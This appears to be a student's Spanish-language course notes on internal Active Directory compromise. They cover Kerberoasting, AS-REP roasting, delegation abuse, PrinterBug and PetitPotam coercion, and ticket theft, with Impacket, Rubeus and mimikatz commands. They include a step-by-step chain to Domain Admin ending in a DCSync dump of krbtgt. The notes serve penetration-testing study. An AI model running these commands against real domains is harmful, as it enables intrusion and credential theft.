
# 8. Compromiso interno
## D1n0 - Alejandro Maman INSO3A U-TAD

### Introducción
Objetivo final: demostrar el impacto mediante el compromiso de los principales activos, normalmente obteniendo acceso como **Domain Admin**.

### Kerberoasting
Solicita tickets de servicio (TGS) de todas las cuentas de servicio (SPNs). Los tickets están cifrados con el hash NTLM de la cuenta de servicio → se crackean offline.

Solo requiere un usuario de dominio (sin privilegios). Muchas cuentas de servicio tienen credenciales débiles.

```bash
# Desde Linux (Impacket)
impacket-GetUserSPNs -request <dominio>/<user> -dc-ip <ip>

# Desde Windows (Rubeus)
Rubeus.exe kerberoast

# Downgrade AES a RC4 (más fácil de crackear)
rubeus.exe kerberoast /tgtdeleg
```
Si el hash comienza por `$23` → RC4. Si comienza por `$18` → AES.

### ASREPRoasting
Para usuarios sin pre-autenticación de Kerberos habilitada. Se solicita un AS-REP y parte de la respuesta se crackea.
```bash
# Identificación con Impacket
impacket-GetNPUsers -request <dominio>/<user> -dc-ip <ip>

# Con Rubeus
Rubeus.exe asreproast
```

### Unconstrained Delegation
Si un equipo tiene delegación sin restricciones, cuando cualquier usuario (incluso un admin) accede a un recurso de esa máquina, su **TGT queda cacheado en memoria**. Comprometiendo la máquina se pueden extraer esos TGTs.
```cmd
# Monitorizar con Rubeus
Rubeus.exe monitor /targetuser:<usuario> /interval:1

# Cargar el ticket en memoria
mimikatz # kerberos::ptt <archivo .kirbi>
```

### Constrained Delegation
Versión más segura y restringida. Se puede identificar con BloodHound:
```cypher
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

### PrinterBug (MS-RPRN)
Si el servicio **Print Spooler** está habilitado, se puede forzar al DC a realizar una conexión → capturar su hash NetNTLMv2.
```bash
# Verificar
impacket-rpcdump <IP objetivo> | grep -A 6 "spoolsv"

# Explotar
python printerbug.py '<dominio>/<usuario>:<clave>'@<IP DC> <IP atacante>
```

### PrinterBug + Unconstrained Delegation = Domain Admin
1. Poner Rubeus a la escucha en la máquina con Unconstrained Delegation:
   ```cmd
   Rubeus.exe monitor /interval:1
   ```
2. Forzar conexión del DC a la máquina con Unconstrained Del:
   ```cmd
   SpoolSample.exe <FQDN DC> <FQDN máquina Unc. Del.>
   ```
3. Generar ticket PTT con el base64 capturado:
   ```cmd
   Rubeus.exe ptt /ticket:<Base64>
   ```
4. Volcar claves del DC:
   ```cmd
   mimikatz# lsadump::dcsync /user:<dominio>\krbtgt
   ```

### PetitPotam (MS-EFSR)
Fuerza una conexión desde la cuenta SYSTEM de una máquina → escalada local de privilegios.
```bash
python petitpotam.py -d <FQDN> -u <usuario> -p <password> <IP atacante> <IP objetivo>
```
Fuente: https://github.com/topotam/PetitPotam/

### Linux Credential Cache (ccache)
En máquinas Linux con Kerberos, los TGTs se cachean en `/tmp/krb5cc_*`. Con root se pueden extraer y convertir a `.kirbi`.
```bash
impacket-ticketConverter <ticket cache> <nuevo ticket.kirbi>
```

---